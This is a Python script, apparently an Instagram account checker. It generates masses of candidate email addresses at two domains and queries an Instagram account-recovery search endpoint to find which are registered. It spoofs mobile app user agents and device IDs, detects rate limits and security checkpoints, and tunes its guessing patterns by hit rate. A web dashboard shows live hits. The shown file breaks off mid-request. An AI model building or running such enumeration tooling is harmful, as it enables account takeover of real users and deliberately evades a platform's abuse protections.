# language: Python 3.10+, file: sodo_checker_v12.py
# *v12 — Render web layer: /health keepalive + /api/stats + live HTML dashboard*
# *v11 — Python 3.14 compat + per-domain ban tracking + domain stats panel*

import requests
import time, os, random, secrets, uuid, json, base64
from threading import Thread, Lock, local as _tlocal
from queue import Queue
from collections import deque
import re as _re

# ─── WEB SERVER (Render) ──────────────────────────────────────────────────────
try:
    from flask import Flask, jsonify, Response
    _FLASK_OK = True
except ImportError:
    _FLASK_OK = False
    print("[!] Flask not found — web dashboard disabled")

PORT        = int(os.environ.get("PORT", 10000))
recent_hits = deque(maxlen=120)
_hits_lock  = Lock()

try:
    from cfonts import render as _cf_render
    def _make_logo():
        return _cf_render('SODO', font='block', colors=['cyan','white'], align='left', space=True)
except ImportError:
    try:
        import pyfiglet as _pf
        def _make_logo():
            return "\033[1;36m" + _pf.figlet_format("SODO", font="block") + "\033[0m"
    except ImportError:
        def _make_logo():
            return (
                "\033[1;36m╔══════════════════════════╗\n"
                "║   S  O  D  O   v12       ║\n"
                "╚══════════════════════════╝\033[0m"
            )

clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

BLOKS_VERSION = "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
DOMAINS = ['@hi2.in', '@telegmail.com']

SA_NAMES = [
    "aryan","rahul","rohit","vikram","nikhil","ankit","deepak","sachin","suresh","rajesh",
    "amit","sumit","ravi","sanjay","vijay","manoj","arun","dinesh","ramesh","sunil",
    "aditya","ishaan","arjun","kabir","ayaan","aarav","vihaan","vishal","gaurav","pankaj",
    "naveen","ajay","akash","harsh","kunal","tarun","vivek","mohit","rohaan","shubham",
    "yash","kartik","rishabh","pranav","tejas","dhruv","naman","lakshya","aman","karan",
    "varun","tushar","sandeep","pradeep","rakesh","mukesh","yogesh","hitesh","ritesh","manish",
    "chirag","hardik","meet","parth","jay","raj","dev","om","ved","krish",
    "sunny","lucky","rinku","sonu","monu","bunty","pintu","pappu","raju","munna",
    "chotu","deepu","vicky","rocky","tony","ronny","danny","harry","prince",
    "mahesh","naresh","ganesh","akhilesh","amitabh","anirudh","ankush","anmol","anshul","anubhav",
    "apurv","arpit","ashish","ashok","ashutosh","atharva","aviral","ayush","bharat","bhaskar",
    "bhavesh","bhupendra","bipin","birendra","chandan","chetan","chirayu","darpan","darshan","dhairya",
    "dhananjay","dharmesh","dhrupad","digvijay","dilip","divyanshu","durgesh","gaurang","girish","govind",
    "gowtham","harish","harmeet","harshal","harshit","hemant","himanshu","ishan","jagdish","jaikumar",
    "jatin","jayant","jeet","jitendra","jitesh","kamlesh","kanhaiya","kapil","kartikeya","kaushal",
    "keshav","kishan","kishor","kuldeep","lalit","lokesh","mahendra","mayank","milind","mithun",
    "mukul","nagesh","narayan","narendra","neeraj","nilesh","niranjan","nirav","nirmal","nishant",
    "nitesh","nitin","omkar","pawan","piyush","prabhakar","pradip","pramod","prashant","pratap",
    "praveen","pravesh","punit","purushottam","raghu","rajeev","rajiv","ramakant","ranjit","ravindra",
    "ravish","reyansh","sachet","sagar","saket","samarth","sameer","sandip","sanjiv","santosh",
    "sarvesh","satish","satya","saurabh","shailendra","shailesh","shashank","shekhar","shiven","shrikant",
    "shubh","shyam","siddharth","siddhesh","soham","sourabh","subhash","sudhakar","suhas","sujit",
    "sumanth","suraj","surendra","swapnil","tirth","uday","umesh","utkarsh","vaibhav","vardhan",
    "vedant","vibhav","vidyut","vikrant","vilas","vinay","vineet","vipul","viraj","vishwas",
    "yashraj","yogendra","yuvraj","rudraksh","mithilesh","sahil","saif","saheb","tanuj",
    "neerav","darsh","vivaan","shivansh","divyansh","agastya","daksh","shreyansh","shlok","arush",
    "murugan","selvam","karthi","subramaniam","rajasekaran","shanmugam","venkatesan","natarajan","annamalai","duraisamy",
    "kumarasamy","marimuthu","muthuswamy","palanisamy","saravanan","senthil","sivakumar","sundaram","thangavel","velmurugan",
    "venkatesh","srinivas","ramakrishna","nagarjuna","manjunath","basavanna","veeranna","somashekhar","chandrashekhar","prabhakar",
    "vijayakumar","sureshkumar","jayakumar","rajkumar","ajithkumar","prashanth","sathish","selvakumar","dineshkumar",
    "balasubramanian","subrahmanyam","krishnamurthy","lakshmanan","arumugam","deivasigamani","ganesan","ilayaraja","muthukumar","rajendran",
    "gurpreet","harpreet","jaspreet","manpreet","navdeep","sukhdeep","amritpal","balwinder","daljit","dilpreet",
    "gurbakhsh","gurmeet","gurvinder","harjinder","harjit","harminder","inderjit","jagjit","karanjit","kuldip",
    "kulwant","lakhbir","lakhwinder","lovpreet","navneet","parminder","ravinder","sarabjit","satinder","satnam",
    "sukhwinder","surinder","tejinder","varinder","gurdeep","pardeep","sandeep","preetinder","rupinder","davinder",
    "souvik","abhijit","subhojit","saptarshi","rajib","ranajit","sandipan","santanu","soumitra",
    "srikanto","subroto","anirban","arnab","debashis","debraj","rishav","saikat","sayak","somnath",
    "subhankar","subrata","supriyo","suvadeep","suvojit","tanmoy","tuhin","ujjal","barun",
    "jignesh","bhavesh","jigar","chintan","dhaval","jayesh","kirit","mehul","milan","mitesh",
    "navin","paresh","rushabh","chirag","dhruv","fenil","hardik","hemang","ketan",
    "lalit","mahesh","manish","mayur","mihir","naresh","niraj","nitesh","paras","parth",
    "amol","omkar","nilesh","swapnil","abhijit","milind","mohan","mangesh",
    "prasad","prashant","rajendra","sanket","vidyadhar","vinayak","satish","shreyas","suyash","tejas",
    "priya","pooja","neha","aarti","divya","sneha","riya","simran","kajal","anjali",
    "kavya","shreya","kiran","meena","laxmi","sunita","geeta","rekha","usha","shilpa",
    "swati","pallavi","deepika","isha","nisha","ritu","komal","seema","reema","trisha",
    "disha","aisha","naina","payal","sonal","ruhi","tanvi","avni","vidhi","khushi",
    "muskan","mehak","nidhi","riddhi","siya","pinki","rinki","mitu","baby","sweety",
    "gudiya","munni","rani","radha","sita","gita","lata","anita","mamta","sapna",
    "pushpa","kamla","sarla","bimla","vimla","aakanksha","aaradhya","aditi","aishwarya","akshara",
    "amrita","ananya","anupriya","anushka","aparna","archana","arushi","ashwini","avantika","bhavana",
    "chandni","chhavi","deepa","deepali","deeksha","devika","durga","esha","farida",
    "gauri","hansika","harsha","heena","hema","himani","indira","ishita","janki","jaya",
    "jyoti","kalpana","kalyani","kamini","kanchan","kavita","kirti","kratika","kusum",
    "madhuri","mahima","mamata","manasi","manisha","manjula","mansi","megha","meghna","menaka",
    "mitali","monisha","mugdha","namrata","nayana","neelam","neeta","parvati","poonam","prachi",
    "pragya","pranjali","prarthana","pratibha","pratima","preeti","preethi","prerna","prisha","priyanka",
    "punam","rajani","rakhi","rashmi","ratna","renu","renuka","rima","ritika","rupal",
    "rupali","sandhya","sangita","shailaja","shakuntala","shanti","shikha","shraddha","shruti",
    "shubhangi","shweta","simi","smita","sowmya","subhadra","sudha","sugandha","sujatha","sunaina",
    "sunanda","sundari","sunetra","sushma","tanisha","tanya","taruna","tripti","tulsi","urvashi",
    "varsha","vasudha","vaishali","veena","vibha","vidya","vijaya","vimala","vineeta","yamini",
    "yogita","zara","noor","mehak","saba","tara","sana","palak","twinkle","monika",
    "meenakshi","bharathi","kousalya","revathi","kamakshi","sumathi","vani","kaveri","amudha","chitra",
    "dhanalakshmi","geetha","gomathi","indumathi","kalaivani","kamatchi","kanimozhi","kavitha","keerthana","lakshmipriya",
    "lalitha","madhavi","malathi","manimegalai","muthammal","nirmala","padmavathi","prabhavathi","pushpam","rajeswari",
    "rathna","rukmini","saraswathi","savithri","selvi","shanthini","shobana","sivakami","sridevi","subashini",
    "suganthi","suganya","tamilarasi","thendral","umamaheswari","valli","vasantha","vijayalakshmi","sowmya","saranya",
    "divyabharathi","jayalakshmi","mahalakshmi","ponmalar","rajalakshmi","ramya","sangeetha","santhiya","saroja",
    "suchitra","sutapa","rituparna","arpita","payel","sampurna","sharmistha","somrita","sukanya","tapasi",
    "indrani","kasturi","moumita","nandita","rupali","sanghamitra","sanjukta","saswati","shubha",
    "sima","sohini","sumita","susmita","swarna","tanushri","tiyasa","barnali","bipasha","chumki",
    "debolina","gargi","jayita","jhuma","kaberi","kalyani","keya","mandira","mimi","namita",
    "purnima","ratnabali","ritika","shatabdi","srijita","sripa","sudipta","sunetra","sutirtha",
    "harsimran","ramandeep","jasleen","manleen","navleen","prabhjot","simranjit","sukhjit","tejpal",
    "hetal","mital","kinjal","dhruvi","foram","jalpa","bhavna","bhumika","drashti","hansika",
    "hiral","jigna","komal","kruti","madhuri","megha","mona","nita","poonam",
    "purvi","sejal","shilpa","shital","smita","sonal","trisha","vibha",
    "imran","bilal","hamza","usman","ahsan","faisal","tariq","nadeem","asad","kamran",
    "rahim","karim","shakil","tanveer","rizwan","shahid","waseem","naveed","farhan","junaid",
    "zubair","waqar","babar","danish","salman","zain","syed","muhamad","osama","adnan",
    "hassan","ali","umar","umer","talha","saad","waleed","owais","ahmed","raza",
    "zohaib","numan","taimur","hashim","muzammil","dawood","suleman","noman","saleem","zahid",
    "pervez","aslam","ghulam","zafar","mumtaz","nazim","javed","shoaib","shahzaib","shahzad",
    "zeeshan","nasir","naeem","naseer","saqlain","aaqib","inzamam","arbaz","asim","atif",
    "ayesha","fatima","nadia","hina","rabia","amna","zainab","bushra","sobia",
    "maham","nimra","iqra","mehwish","anum","rida","maryam","alina","sumera","huma",
    "areeba","rimsha","kinza","laiba","hoorain","tooba","minahil","faiza","zoha",
    "hira","nawal","maira","areesha","mahira","sidra","eman","tahira","shabnam",
    "nasreen","rukhsana","saima","shabana","samia","nargis","sumbal","lubna","raheela","sitara",
    "nida","parveen","tahmina","tashfia","shirin","maheen","saniya","ramsha","momina","abida",
    "ahmadullah","rahimullah","nasrullah","bismillah","habibullah","noorullah","faridullah","ghulam","sardar","sher",
    "yousaf","obaid","obaidullah","zabihullah","shafiullah","ziaulhaq","hizbullah","nazir","hafiz","basir",
    "bashir","amanullah","aminullah","khairullah","zarif","zulmai","zalmai","zia","mirwais","faizullah",
    "ajmal","atiqullah","jawad","ihsanullah","ezatullah","tamim","samiullah","sarfaraz","nawab","ghani",
    "akhtar","javid","zarghuna","spozmai","latifa","mahgul","gulnaz","shakila","malalai","soraya",
    "zuhra","marwa","mursal","sediqa","freshta","hawa","shafiqa","razia","nazifa","shaima",
    "tamana","zarmeena","halima","ruqia",
    "bikash","saroj","pradip","nabin","nabeen","binod","binay","bijay","govinda","hari",
    "prem","roshan","sudeep","sujan","bibek","bishnu","kishor","lokendra","nirajan","paras",
    "rajan","saurav","shekhar","shiva","tilak","upendra","yam","yubraj","anita","binita",
    "dipa","kabita","kanchan","mala","maya","nirmala","parbati","renu","resham","rita",
    "rupa","sabitri","sanju","sapana","sarswoti","sarita","savitri","srijana","sweta","uma",
    "nuwan","chaminda","sanath","ajith","mahela","lasith","thilan","tharanga","suranga","upul",
    "chatura","dimuth","lahiru","niroshan","dasun","pathum","wanindu","dilrukshi","chamari","hasini",
    "nilmini","sachini","sandamali","sewwandi","thilini","uthpala","nadeesha","hiruni","kaushalya",
    "madushika","piyumi","rashmi","ridma","thilanka","uresha",
    "amir","omar","hassan","yusuf","farouk","sami","kareem","zaid","tarek","khalid",
    "majid","walid","samir","adel","bassam","nasser","fawaz","saleh","anas","faris",
    "abdulla","mohamad","mohammad","mahmoud","mustafa","ibrahim","ismail","yousef","salem",
    "nabil","wael","mazen","rami","hani","marwan","yasir","amr","tamer","khaled",
    "mansur","hatim","rashid","rasheed","turki","sultan","fahad","nawaf","talal",
    "bader","bandar","saud","naif","hamdan","saeed","humaid","obaid","zayed","hamad",
    "tamim","jasim","raed","mishal","bassel","maher","moaz","layth","qais","ziad",
    "sharif","taher","waheed","wissam","abdulaziz","abdulrahman","abdulkarim","abdulhamid","abdulmalik","abdullatif",
    "layla","mariam","yasmin","rania","dina","hana","lina","rana","reem",
    "mona","dalia","nada","ghada","heba","ola","mai","amal","abeer","dana",
    "lujain","reema","hessa","shaikha","maitha","hend","amira","haneen","inas","jumana",
    "kholoud","mawaddah","maysoon","nahed","nawal","nihad","noha","raghda","rahaf","rand",
    "raneem","rawan","reham","rima","ruba","rula","saba","sahar","samar","samira",
    "suha","suhaila","tahani","thurayya","wafa","wedad","yusra","bushra","fadwa","ghufran",
    "yassine","amine","hamza","hicham","reda","younes","ayoub","zakaria","soufiane","ilyas",
    "badr","othmane","marouane","oussama","imad","rachid","hossam","mostafa","khaled","sherif",
    "yehia","amro","tamer","hatem","ayman","osama","hazem","tarek","wael","eslam",
    "fatima","khadija","zineb","sara","leila","meryem","amina","hafsa","rim","kawtar",
    "rania","hind","siham","ikram","ghizlan","loubna","manal","noura","salma","wafa",
    "yasmine","karima","aicha","houda","lina","nadia","samira","sabrina","asma","hanane",
    "bobur","jasur","sardor","ulugbek","eldor","javlon","sarvarbek","doniyor","nodir","muzaffar",
    "alisher","oybek","sherzod","behruz","farhodjon","laziz","mirzo","obid","otabek","shohruh",
    "tohir","umid","zafar","zohid","dilnoza","gulnora","hulkar","mahliyo","maftuna","mohira",
    "nargiza","nilufar","ozoda","sarvinoz","shahlo","yulduz","zulfiya","feruza","iroda","kamola",
    "lola","madina","malika","nozima","oydin","sevinch","sitora","umida","ziyoda",
    "aibek","akhmet","alibek","arman","askar","baurzhan","bekzat","dauren","dias","erlan",
    "galymzhan","kairat","marat","nurbek","nurlan","ruslan","sultan","yerlan","yerbol","zhandos",
    "aigerim","ainur","aliya","dinara","farida","gulnara","marzhan","nurgul","saule","symbat",
    "ulzhan","zarina",
    "arash","sina","reza","mehdi","hossein","shervin","armin","pouya","kian","babak",
    "kaveh","farhad","nima","kamyar","shahram","shayan","payam","parsa","pejman","peyman",
    "farbod","ashkan","bardia","borna","danial","ehsan","erfan","farshad","farzad","farzin",
    "hamed","javad","majid","matin","mojtaba","morteza","mostafa","nader","omid","parviz",
    "pedram","pouyan","ramin","rasool","saeid","sajjad","shahab","shahin","vahid","yashar",
    "leila","zahra","fatemeh","shirin","parisa","niloofar","fereshteh","golnaz","nazanin","shadi",
    "baran","bahar","neda","mahsa","mina","mitra","mojgan","nasim","nasrin","naz",
    "parastoo","pegah","roya","reyhaneh","sanaz","sarina","setareh","shahrzad","soheila","solmaz",
    "tahmineh","taraneh","vida","yasaman","yekta","elnaz","elaheh","masoumeh","saeedeh","soghra",
]

GLOBAL_NAMES = SA_NAMES + [
    "budi","andi","rizki","fajar","dian","sari","dewi","maya","rina","nina",
    "agus","wahyu","eko","hendra","ferry","rudi","dedi","iwan","sinta","wulan",
    "fitri","indah","ratna","sri","yanti","ani","ahmad","nurul","siti","mohd",
    "bagus","bayu","cahyo","dimas","edo","felix","gilang","hafidz","irfan","joko",
    "kevin","lukman","mario","naufal","okta","putra","rendi","satria","tegar",
    "ujang","vino","wahid","yudi","zaki","ayu","bunga","citra","dita",
    "eka","farida","habibah","ida","julia","kartika","lestari","mira","nita",
    "ocha","putri","qonita","siska","tina","ulfa","vivi","winda","yuni",
    "aziz","hafiz","syafiq","haziq","amirah","faizal","hanis","afiq","asyraf","hidayah",
    "izzat","jannah","khairul","luqman","maisarah","nadhira","syahmi",
    "taufiq","umairah","zulaikha","aishah","balqis","darwisyah","erma","farhana","ghazali","izzati",
    "mark","jerome","vincent","christian","grace","joy","angel","joseph","juan","maria",
    "jose","carlo","princess","angelica","rhea","christy","divine","lovely","myra","gina",
    "nguyen","tran","le","pham","hoang","vo","minh","duc","hung","tuan",
    "anh","binh","chinh","dung","giang","hai","huong","khanh","lan","long",
    "mai","nam","nga","nhung","phong","quynh","son","thanh","thao","thu",
    "trang","trinh","van","xuan","yen","hieu","khoa","lam","linh","luan",
    "somchai","somsak","narong","wanchai","surachai","surin","kamon","teerayuth","prayut","artit",
    "nida","natchaya","pim","warisa","fah","bow","wan","mod","nueng","sai",
    "aung","kyaw","myint","thant","zaw","lwin","myo","naing","nyi","saw",
    "soe","tun","win","htet","phyo","sithu","thiha","aye","khin","kyi",
    "wei","lei","fang","min","jing","ling","hong","ping","yang","xiao",
    "jun","ming","bin","tao","hao","xu","zhen","li","wang","zhang",
    "chen","liu","zhao","wu","sun","zhou","cheng","luo","guo","he",
    "kenji","yuki","haruto","sota","yui","mio","rin","aoi","hana","sakura",
    "riku","kaito","ryota","yuto","hinata","nana","kana","sora","ren","nao",
    "jisoo","minho","taehyung","jimin","soyeon","minji","yeji","ryujin","hyunjin","seungmin",
    "jihoon","junhoe","jinhwan","yunhyeong","chanwoo","donghyuk","hanbin","bobby","yunho",
    "kwame","kofi","ama","abena","kojo","yaw","emeka","chidi","ngozi","amaka",
    "tunde","seun","tobi","dayo","femi","ade","sola","lola","kemi","yemi",
    "njoroge","wanjiru","kamau","mwangi","kariuki","ouma","otieno","odhiambo","achieng","awuor",
    "abebe","girma","tesfaye","kebede","yohannes","haile","dawit","solomon","biruk","ermias",
    "thabo","sipho","nkosi","siyanda","sithembile","lungelo","mthokozisi","sandile","siyabonga",
    "mehmet","ahmet","huseyin","osman","fatma","ayse","zeynep","elif","merve","esra",
    "burak","serkan","emre","murat","onur","busra","pinar","irem","bahar","semra",
    "luis","carlos","jorge","alejandro","david","carmen","ana","laura","paula","elena",
    "diego","andres","sebastian","nicolas","valentina","lucia","mariana","catalina","andrea","diana",
    "joao","pedro","matheus","thiago","rafael","bruno","gustavo","isabela","fernanda","camila",
    "max","felix","leon","paul","jan","lena","anna","julia","lisa","sophie",
    "lucas","hugo","gabriel","arthur","thomas","lea","emma","chloe","manon","camille",
    "james","jack","george","harry","charlie","oliver","emily","lily","jessica","ella",
    "noah","liam","ethan","mason","logan","aiden","jackson","sebastian","jayden","mateo",
    "ivan","dmitry","mikhail","alexei","nikolai","sergei","andrei","pavel","roman","artem",
    "anastasia","natasha","olga","tatiana","elena","irina","svetlana","dasha",
]

LAST_NAMES = [
    "sharma","verma","gupta","singh","kumar","yadav","patel","joshi","mehta","mishra",
    "pandey","dubey","tiwari","chauhan","rajput","thakur","rao","reddy","nair","menon",
    "iyer","pillai","krishnan","naidu","rajan","chatterjee","banerjee","mukherjee","ghosh","das",
    "bose","roy","sen","dey","chakraborty","ganguly","bhattacharya","dutta","sarkar","biswas",
    "shah","kapoor","malhotra","khanna","chopra","bhatia","anand","saxena","aggarwal","garg",
    "khan","malik","chaudhry","qureshi","sheikh","siddiqui","hussain","mirza","baig","ansari",
    "butt","rana","cheema","bhatti","gondal","lodhi","mughal","warraich","baloch",
    "al","bin","rahman","abdullah","hassan","hussein","ali","omar","mansour","khalil",
    "smith","johnson","williams","jones","brown","davis","miller","wilson","moore","taylor",
    "silva","santos","oliveira","souza","lima","pereira","ferreira","alves","costa","carvalho",
    "lee","kim","park","choi","jung","yoon","lim","oh","kwon","jeon",
    "nguyen","tran","le","pham","vo","hoang","dinh","dang","bui","do",
    "subramaniam","venkatesan","krishnamurthy","narayanan","pillai","menon","nair","iyer","rao",
    "ahmed","mohammad","hussain","ali","khan","malik","sheikh","siddiqui","qureshi","ansari",
    "kowalski","wojcik","kowalczyk","kaminski","lewandowski","zielinski","szymanski","wozniak",
    "mueller","schmidt","schneider","fischer","weber","meyer","wagner","becker","schulz","hoffmann",
    "popescu","ionescu","popa","gheorghe","lazar","stan","stoica","dumitru","constantin","munteanu",
    "de","van","den","der","ten","berg","boer","smit","bakker","visser",
    "andersen","hansen","jensen","nielsen","petersen","eriksen","larsen","christensen","thomsen","johansson",
]

COMMON_WORDS = [
    "gaming","official","india","love","life","dream","star","king","queen","boss",
    "legend","pro","ninja","dark","shadow","fire","ice","blood","ghost","wolf",
    "lion","tiger","eagle","phoenix","dragon","storm","thunder","lightning","blade","viper",
    "real","true","only","just","pure","best","top","big","mad","wild",
    "desi","hindi","punjabi","bengali","tamil","telugu","marathi","gujarati","rajasthani","bihari",
    "music","photo","art","style","fashion","travel","food","tech","code","hack",
    "cool","dope","swag","vibe","flex","grind","hustle","daily","diary","live",
    "boy","girl","bro","sis","guy","man","lady","babe","baby","cute",
    "pakistan","india","arab","bd","np","lk","sa","ae","ksa","uae",
    "pk","desi","nawab","sultan","amir","prince","princess","queen","royal","elite",
]

IG_PREFIXES = [
    "its","the","iam","im","real","only","just","mr","ms","miss","sir",
    "official","xo","xx","hey","hi","yo","aka","dj","mc",
    "bhai","yaar","jaan","dost","bae","love","life",
]

HOT_SUFFIXES = (
    list("123456789") * 30 +
    ["12","21","11","22","99","00","01","10","23","32","45","54"] * 15 +
    ["786","007","123","420","143","69","000","111","222","333","999",
     "100","101","1234","12345","786786","007007"] * 12 +
    [str(n) for n in range(1,100)] * 5 +
    [str(n) for n in range(100,1000)]
)

SUFFIXES = (
    HOT_SUFFIXES +
    ["","x","xo","xx","vip","pro","yt","ig","tv","pk","in","bd","sa","ae","ksa",
     "_x","_v","_official","_real","_ig","_pk","_in","_bd",
     "official","real","king","queen","boss","star","gaming","bro","sis","xox",
     "bhai","ji","g","yaar","pk","bd","np","lk"]
)

BIRTH_YEARS = [str(y) for y in range(1985, 2008)]
DOB_COMBOS  = (
    [f"{d:02d}{m:02d}" for d in range(1,32) for m in range(1,13)] +
    [f"{m:02d}{d:02d}" for d in range(1,32) for m in range(1,13)] +
    [str(n) for n in range(1000, 10000)]
)

EXPAND_SUFFIXES = [
    "","1","2","3","12","21","123","786","007",
    "99","100","420","143","11","22","01","0",
    "x","xx","ig","official","real","pro","yt",
    "2024","2025","2026","24","25","26",
]

IOS_VERSIONS  = ["16_6","17_0","17_1","17_2","17_3","17_4","17_5"]
IOS_DEVICES   = ["iPhone14,2","iPhone14,3","iPhone15,2","iPhone15,3","iPhone16,1","iPhone16,2"]

def ios_ua():
    iv  = random.choice(IOS_VERSIONS)
    dev = random.choice(IOS_DEVICES)
    ver = random.choice([290,300,310,320,330,340])
    return (f"Instagram {ver}.0.0.{random.randint(10,99)} "
            f"({dev}; iOS {iv}; en_US; en-US; "
            f"scale=3.00; 1170x2532; {random.randint(400000000,500000000)})")

def android_ua():
    brand      = random.choice(["samsung","Google","Xiaomi","OnePlus","Nothing","Realme","Redmi"])
    model      = random.choice(["SM-G973F","Pixel 7","M2102J20SG","ONEPLUS A6003","A063"])
    dpi_val    = random.choice(["420","450","440"])
    res_val    = random.choice(["1080x2280","1080x2400","1440x3088"])
    android_ver= random.choice(["11","12","13","14"])
    insta_ver  = random.choice([280,290,300,310,320,330,340])
    return (f"Instagram {insta_ver}.0.0.{random.randint(10,99)} Android "
            f"({android_ver}; {dpi_val}dpi; {res_val}; {brand}; {model}; en_US)")

def random_ua():
    return ios_ua() if random.random() < 0.4 else android_ua()

VOWELS     = 'aeiou'
CONSONANTS = 'bcdfghjklmnpqrstvwxyz'
LEET_MAP   = {'a':'4','e':'3','i':'1','o':'0','s':'5','t':'7'}

PATTERN_NAMES = [
    "bare_name","name+1digit","name+hotsfx",
    "name+suffix","name+year","first+last","first_last","word+suffix",
    "num+name","leet","pronounceable","short","phone","4digit","dob",
    "ig_prefix","random","expand","+dup","hotseed",
]

def pronounceable(length=6):
    result, use_v = [], random.choice([True, False])
    for _ in range(length):
        result.append(random.choice(VOWELS if use_v else CONSONANTS))
        use_v = not use_v
    return ''.join(result)

def leet(name):
    return ''.join(LEET_MAP.get(c, c) for c in name.lower())

def phone_style():
    s = random.randint(0, 2)
    if s == 0:
        return random.choice(['9','8','7']) + ''.join(random.choices('0123456789', k=9))
    elif s == 1:
        return ''.join(random.choices('0123456789', k=random.randint(6,8)))
    else:
        return '0' + ''.join(random.choices('0123456789', k=9))

AUTO_TUNE_INTERVAL = 300
MIN_TUNE_CHECKS    = 25
_CYCLE_PATTERNS = [
    "bare_name","name+1digit","name+hotsfx","name+suffix","name+year",
    "first+last","first_last","word+suffix","num+name","leet",
    "phone","4digit","dob","ig_prefix","hotseed",
]
_weighted_pool      = _CYCLE_PATTERNS[:]
_weighted_pool_lock = Lock()
_last_tune_total    = 0
_tune_count         = 0

def rebuild_weighted_pool():
    global _weighted_pool, _tune_count
    new_pool = []
    with lock:
        ph = dict(pattern_hits)
        pc = dict(pattern_checks)
    for pat in _CYCLE_PATTERNS:
        checks = pc.get(pat, 0)
        hits   = ph.get(pat, 0)
        if checks < MIN_TUNE_CHECKS:
            slots = 2
        else:
            rate  = hits / checks
            slots = max(1, min(25, int(rate * 4500) + 1))
        new_pool.extend([pat] * slots)
    with _weighted_pool_lock:
        _weighted_pool = new_pool
        _tune_count   += 1

def auto_tune_thread():
    global _last_tune_total
    while True:
        time.sleep(10)
        with lock:
            cur = total
        if cur - _last_tune_total >= AUTO_TUNE_INTERVAL:
            rebuild_weighted_pool()
            rebuild_domain_pool()
            with lock:
                _last_tune_total = total

domain_hits    = {d: 0 for d in DOMAINS}
domain_checks  = {d: 0 for d in DOMAINS}
domain_blocked = {d: 0 for d in DOMAINS}
_domain_pool   = DOMAINS[:] * 5
_domain_pool_lock = Lock()

def rebuild_domain_pool():
    global _domain_pool
    new_pool = []
    with lock:
        dh = dict(domain_hits)
        dc = dict(domain_checks)
    for d in DOMAINS:
        checks = dc.get(d, 0)
        hits   = dh.get(d, 0)
        if checks < 40:
            slots = 5
        else:
            rate  = hits / max(1, checks)
            slots = max(2, min(18, int(rate * 3500) + 2))
        new_pool.extend([d] * slots)
    with _domain_pool_lock:
        _domain_pool = new_pool

def pick_domain():
    with _domain_pool_lock:
        if not _domain_pool:
            return random.choice(DOMAINS)
        return random.choice(_domain_pool)

hot_seeds = deque(maxlen=55)
hot_lock  = Lock()

def generate_mutations(prefix_only):
    base = ''.join(c for c in prefix_only if c.isalnum())
    if len(base) < 3:
        return []
    muts = set()
    for es in EXPAND_SUFFIXES:
        muts.add(base + es)
    l = leet(base)
    muts.add(l)
    for es in ["", "1", "12", "786", "007", "x", "ig"]:
        muts.add(l + es)
    for y in ["24", "25", "26", "2024", "2025", "2026", "99", "00", "11"]:
        muts.add(base + y)
        if len(base) > 4:
            muts.add(base[:-1] + y)
    if len(base) >= 5:
        muts.add(base[:4] + random.choice(LAST_NAMES))
        muts.add(base[:5] + random.choice(["x", "xx", "ig", "pro"]))
    if len(base) > 6:
        muts.add(base[:5])
        muts.add(base[:6] + random.choice("123456789"))
    alpha = ''.join(c for c in base if c.isalpha())
    if len(alpha) >= 4:
        muts.add(alpha)
        muts.add(alpha + random.choice(HOT_SUFFIXES[:80]))
    return list(muts)[:18]

_tl = _tlocal()

def _next_pat():
    if not getattr(_tl, 'deck', None):
        with _weighted_pool_lock:
            pool = _weighted_pool[:]
        random.shuffle(pool)
        _tl.deck = pool
    return _tl.deck.pop()

def smart_prefix(domain):
    with hot_lock:
        use_hot = hot_seeds and random.random() < 0.22
        seed = random.choice(list(hot_seeds)) if use_hot else None
    if use_hot and seed:
        if random.random() < 0.55:
            muts = generate_mutations(seed)
            if muts:
                return random.choice(muts), "hotseed"
        return seed, "hotseed"
    pool = SA_NAMES if domain == '@hi2.in' else GLOBAL_NAMES
    pat  = _next_pat()
    if pat == "bare_name":
        return random.choice(pool), pat
    elif pat == "name+1digit":
        return random.choice(pool) + random.choice("123456789"), pat
    elif pat == "name+hotsfx":
        return random.choice(pool) + random.choice(HOT_SUFFIXES), pat
    elif pat == "name+year":
        return random.choice(pool) + random.choice(BIRTH_YEARS), pat
    elif pat == "first+last":
        return random.choice(pool) + random.choice(LAST_NAMES), pat
    elif pat == "first_last":
        sep = random.choice(['_','.',''])
        return random.choice(pool) + sep + random.choice(LAST_NAMES), pat
    elif pat == "word+suffix":
        return random.choice(COMMON_WORDS) + random.choice(HOT_SUFFIXES), pat
    elif pat == "num+name":
        num = random.choice(['007','786','123','99','01','000','420'])
        return num + random.choice(pool), pat
    elif pat == "leet":
        return leet(random.choice(pool)) + random.choice(HOT_SUFFIXES[:200]), pat
    elif pat == "pronounceable":
        return pronounceable(random.randint(5,7)), pat
    elif pat == "short":
        chars = 'abcdefghijklmnopqrstuvwxyz'
        return ''.join(random.choices(chars, k=random.randint(2,8))), pat
    elif pat == "phone":
        return phone_style(), pat
    elif pat == "4digit":
        return str(random.randint(1000,9999)), pat
    elif pat == "dob":
        return random.choice(pool) + random.choice(DOB_COMBOS[:500]), pat
    elif pat == "ig_prefix":
        sep = random.choice(['.','_',''])
        return random.choice(IG_PREFIXES) + sep + random.choice(pool), pat
    elif pat == "name+suffix":
        return random.choice(pool) + random.choice(SUFFIXES), pat
    elif pat == "hotseed":
        return random.choice(pool) + random.choice(["", "1", "12", "x"]), pat
    else:
        chars = 'abcdefghijklmnopqrstuvwxyz'
        return ''.join(random.choices(chars, k=random.randint(6,8))), pat

BLOCK_SIGNALS = [
    "checkpoint_required","challenge_required",
    "rate_limited","too_many_requests","please_wait","consent_required"
]

def is_blocked(text, code):
    if code == 429:
        return True
    tl = text.lower()
    return any(sig in tl for sig in BLOCK_SIGNALS)

def extract_name(prefix):
    m = _re.match(r'[^a-zA-Z]*([a-zA-Z]+)', prefix)
    return m.group(1) if m else prefix

def build_session():
    s = requests.Session()
    s.mount("https://", requests.adapters.HTTPAdapter(
        pool_connections=1, pool_maxsize=1, max_retries=0
    ))
    return s

def check_instagram_email(session, email, retries=1):
    url    = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    device = str(uuid.uuid4())
    family = str(uuid.uuid4())
    android= "android-" + secrets.token_hex(8)
    ua     = random_ua()
    payload = {
        'params': json.dumps({
            "client_input_params": {
                "search_query":           email,
                "search_screen_type":     "email_or_username",
                "ig_android_qe_device_id": device,
                "is_whatsapp_installed":  1,
                "accounts_list":          [],
                "fetched_email_list":     [],
            },
            "server_params": {
                "device_id":        android,
                "family_device_id": family,
                "qe_device_id":     device,
                "login_surface":    "login_home",
                "waterfall_id":     str(uuid.uuid4()),
                "is_from_logged_out": 0,
                "login_entry_point":  "logged_out",
